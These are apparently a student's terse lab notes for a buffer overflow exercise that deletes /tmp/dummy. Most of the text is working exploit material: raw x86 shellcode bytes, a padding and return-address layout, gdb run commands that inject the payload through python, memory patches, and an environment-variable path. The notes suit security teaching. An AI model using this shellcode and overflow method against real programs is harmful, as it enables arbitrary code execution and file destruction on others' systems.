# Lab3

## Exploit return-to-lib-c vulnerability, delete file "dummy" in directory /tmp/dummy using environment variable.

\xeb\x1a\xb8\xa8\x90\x04\x08\xe8\x15\x00\x00\x00\x89\xc3\x31\xc0\xb0\x08\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe1\xff\xff\xff\x8b\x44\x24\x04\xc3

72 = 38 (shellcode) + 30 (placement code) + 4 bytes(return address);

>r $(python -c "print('\xeb\x1a\xb8\xa8\x90\x04\x08\xe8\x15\x0f\x0f\x0f\x89\xc3\x31\xc0\xb0\x08\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe1\xff\xff\xff\x8b\x44\x24\x04\xc3'+'a'*30+'\xff\xff\xff\xff')")


# now
>r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x74\x6d\x70\x2f\x64\x75\x6d\x6d\x79\x0f'+'a'*32+'\xff\xff\xff\xff')")


>r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0f'+'a'*32+'\xff\xff\xff\xff')")

>x/80xb $esp

>set *0xffffd6eb=0x61616100

>set *0xffffd70c=0xffffd6c8

>set *0xffffd6d1=0xffffd6e2


>export my_path='tmp/dummy'
>printenv